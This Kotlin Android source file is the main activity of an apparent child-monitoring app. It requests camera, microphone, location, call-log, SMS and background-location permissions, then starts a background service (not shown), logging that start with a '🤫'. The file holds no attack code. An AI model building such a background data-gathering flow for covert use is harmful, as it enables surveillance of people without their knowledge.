package com.soumo.child

import android.annotation.SuppressLint
import android.content.Intent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.compose.setContent
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import com.soumo.child.permissions.PermissionManager
import com.soumo.child.ui.ChildUI
import android.util.Log

/** ————————————————————————————————————————————————————————————————————————————————
 * MainActivity.kt
 * ————————————————————————————————————————————————————————————————————————————————
 * MainActivity is the main entry point of the app.
 * It loads the UI by canning - CatalogFragment.
 * It also manages permission requests using PermissionManager.
 * Permissions are requested just once when the activity is created. Annoying repeated requests are avoided.
 * If any permission is denied, the app will not function fully but will not keep asking for permissions.
 * Any denied permissions will disable some features but not crash the app.
 * The permission flow is as follows:
 * 1. Request foreground permissions (camera, audio, location, call log, SMS, notifications if Android 13+).
 * 2. If foreground permissions are granted, request background location permission (if Android 10+).
 * On granting all permissions, it starts BackgroundService.
 */
class MainActivity : AppCompatActivity() { // Main entry point of the app
    private var statusText by mutableStateOf("Connecting…")
    private var statusReceiver: BroadcastReceiver? = null
    private lateinit var permissionManager: PermissionManager // Manages permission requests
    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) { // Called when activity is created
        super.onCreate(savedInstanceState) // Call superclass implementation
        permissionManager = PermissionManager(this) // Initialize PermissionManager
        setContent { // Set the UI content using Jetpack Compose
            ChildUI(
                context = this, // pass activity context
                statusText = statusText // pass status to UI
            )
        }

        // Register broadcast receiver for connection status
        val filter = IntentFilter(BackgroundService.ACTION_CONNECTION_STATUS)
        statusReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val s = intent?.getStringExtra(BackgroundService.EXTRA_STATUS)
                if (!s.isNullOrBlank()) {
                    Log.d("MainActivity", "Status update: $s")
                    statusText = s
                    // Trigger recomposition via mutableState
                }
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(statusReceiver, filter, BackgroundService.PERMISSION_CONNECTION_STATUS, null, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(statusReceiver, filter, BackgroundService.PERMISSION_CONNECTION_STATUS, null)
        }

        // Check if permissions are already granted and start service immediately
        if (permissionManager.allPermissionsGranted()) {
            Log.d("MainActivity", "▲ → Permissions already granted, starting BackgroundService")
            val svc = Intent(this, BackgroundService::class.java) // Intent for BackgroundService
            startService(svc) // Start the service
            Log.d("MainActivity", "→ → BackgroundService started")
        } else {
            permissionManager.startPermissionFlow() // Start permission request flow
        }
    }

    override fun onDestroy() {
        try {
            statusReceiver?.let { unregisterReceiver(it) }
        } catch (_: Exception) { }
        statusReceiver = null
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) { // Handle permission request results
        super.onRequestPermissionsResult(requestCode, permissions, grantResults) // Call superclass implementation
        permissionManager.onRequestPermissionsResult(requestCode) { allGranted -> // Callback with overall permission result
            if (allGranted) {
                Log.d("MainActivity", "🫡 All permissions granted, starting BackgroundService")
                val svc = Intent(this, BackgroundService::class.java)
                startService(svc)
                Log.d("MainActivity", "🤫 BackgroundService start command sent")
            } else {
                Toast.makeText(this, "App will not work properly if any permission is denied.", Toast.LENGTH_LONG).show()
                Log.d("MainActivity", "❌ Some permissions denied, app may have limited functionality")
            }
        }
    }
}